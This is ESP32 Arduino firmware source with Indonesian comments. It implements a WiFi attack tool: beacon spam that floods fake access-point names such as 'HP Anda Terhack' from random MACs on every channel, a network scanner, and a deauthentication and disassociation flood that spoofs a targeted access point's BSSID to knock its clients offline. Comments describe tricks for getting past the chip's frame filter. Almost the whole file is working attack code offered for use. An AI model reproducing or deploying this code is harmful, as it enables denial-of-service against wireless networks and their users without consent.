#include <Arduino.h>
#include <globals.h>
#include "esp_wifi.h"
#include "esp_private/wifi.h" // RAHASIA: Masuk ke dapur driver



// Fungsi sakti buat ubah String MAC ke Bytes
void stringToMac(String macStr, uint8_t *macAddr) {
  int values[6];
  if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
    for (int i = 0; i < 6; ++i) macAddr[i] = (uint8_t)values[i];
  }
}


uint8_t beaconPacket[128] = {
    0x80, 0x00, // Frame Control: Beacon
    0x00, 0x00, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (Nanti di-random)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (Nanti di-random)
    0x00, 0x00, // Sequence Number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00, // Beacon Interval
    0x01, 0x04, // Capability Info
    0x00 // Tag Number: SSID
};

// List SSID buat ngerjain temen/orang (Bisa lu ganti sesuka hati)
const char* fakeSSIDs[] = {
    "Pencuri Data", "HP Anda Terhack", "RootX-Terminal", 
    "Beli Bakso Gratis", "Koneksi Lemot", "Polisi Siber", 
    "Minta Password?", "Pencari Janda"
};

const char* rickRollLyrics[] = {
  "1_Never gonna give you up",
  "2_Never gonna let you down",
  "3_Never gonna run around",
  "4_And desert you",
  "5_Never gonna make you cry",
  "6_Never gonna say goodbye",
  "7_Never gonna tell a lie",
  "8_And hurt you"
};


// --- TEMPLATE PAKET ALA GHOST-ESP ---
uint8_t deauthFrame[26] = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
uint8_t disasFrame[26]  = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };



// ... (beaconPacket, fakeSSIDs, rickRollLyrics, deauthFrame lu tetep sama) ...

void loopWiFi(void * pvParameters) {
  for(;;) {
    // --- 1. LOGIKA BEACON SPAM ---
    if (isSpamming) {
      if (!spamUdahSetup) {
        esp_wifi_set_mode(WIFI_MODE_STA); // STA lebih stabil buat beacon
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_ps(WIFI_PS_NONE); // MATIIN POWER SAVE
        spamUdahSetup = true;
      }
      if (aktifModeSpam == 1) {
        int randomIdx = esp_random() % 8; 
        sendBeacon(fakeSSIDs[randomIdx]);
        vTaskDelay(10 / portTICK_PERIOD_MS); 
      } 
      else if (aktifModeSpam == 2) {
        for (int i = 0; i < 8; i++) {
          sendBeacon(rickRollLyrics[i]); 
          vTaskDelay(5 / portTICK_PERIOD_MS);
        }
      }
      vTaskDelay(50 / portTICK_PERIOD_MS);
    } 
    
    // --- 2. LOGIKA WIFI SCANNER ---
    else if (triggerScan) {
      sedang_scan = true;
      adaTarget = false;
      targetLockedIdx = -1;
      totalWiFi = 0;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      vTaskDelay(100 / portTICK_PERIOD_MS);

      int n = WiFi.scanNetworks();
      totalWiFi = (n > 30) ? 30 : n;
      for (int i = 0; i < totalWiFi; ++i) {
        listWiFi[i].id = i;
        listWiFi[i].ssid = WiFi.SSID(i);
        listWiFi[i].rssi = WiFi.RSSI(i);
        listWiFi[i].channel = WiFi.channel(i);
        listWiFi[i].mac = WiFi.BSSIDstr(i);
      }
      sedang_scan = false;
      scanDone = true;
      triggerScan = false;
    }

    // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
    // Pindahin ke luar biar mandiri Cok!
            else if (isDeauthing && adaTarget) {
      if (!deauthUdahSetup) {
        esp_wifi_stop();
        esp_wifi_set_mode(WIFI_MODE_APSTA); // S3 lebih "bocor" di mode APSTA
        esp_wifi_start();
        esp_wifi_set_ps(WIFI_PS_NONE); // WAJIB MATIIN POWER SAVE
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
        deauthUdahSetup = true;
      }

      uint8_t apMac[6];
      stringToMac(targetTerkunci.mac, apMac);
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

      for (int b = 0; b < 60; b++) {
        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
        
        // SUNTIK NILAI PAS MAU NEMBAK DOANG
        deauthFrame[0] = 0xc0; // Deauth
        memcpy(&deauthFrame[4], broadcast, 6);
        memcpy(&deauthFrame[10], apMac, 6);
        memcpy(&deauthFrame[16], apMac, 6);
        deauthFrame[22] = seq & 0xFF;
        deauthFrame[23] = (seq >> 8) & 0xFF;

        // TEKNIK DISASSN (Sering lolos filter hardware S3 dibanding deauth)
        uint8_t disasPacket[26];
        memcpy(disasPacket, deauthFrame, 26);
        disasPacket[0] = 0xa0; // Change to Disassoc

        // TEMBAK PAKE en_sys_seq = true (Hardware Hijack)
        // Interface STA biasanya lebih "longgar" validatornya
        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, true); 
        esp_wifi_80211_tx(WIFI_IF_STA, disasPacket, 26, true);

        // BALIKIN KE NOL BIAR GAK KEDETECT SCANNER INTERNAL
        deauthFrame[0] = 0x00; 
        
        delayMicroseconds(100);
      }
      vTaskDelay(1 / portTICK_PERIOD_MS);
    }



    // --- 4. CLEANUP (MATIIN RADIO KALO GAK DIPAKE) ---
    if (!isSpamming && !isDeauthing && !triggerScan && !sedang_scan) {
      wifi_mode_t m;
      esp_wifi_get_mode(&m);
      if (m != WIFI_MODE_NULL) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        esp_wifi_set_mode(WIFI_MODE_NULL);
        deauthUdahSetup = false;
        spamUdahSetup = false;
      }
    }
    vTaskDelay(10 / portTICK_PERIOD_MS); 
  }
}


void sendBeacon(String ssid) {
    int ssidLen = ssid.length();
    
    // 1. Acak MAC Address (Source & BSSID)
    for(int i=10; i<16; i++) {
        uint8_t r = esp_random() % 256;
        beaconPacket[i] = r;      
        beaconPacket[i+6] = r;    
    }

    // 2. Pasang Nama SSID ke Paket
    beaconPacket[37] = ssidLen;
    for(int i=0; i<ssidLen; i++) {
        beaconPacket[38+i] = ssid[i];
    }

    // 3. Tambah Tail (Akhiran Paket)
    uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
    memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));

    // 4. Tembak Keliling Channel
    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
        vTaskDelay(1); 
    }
}


    
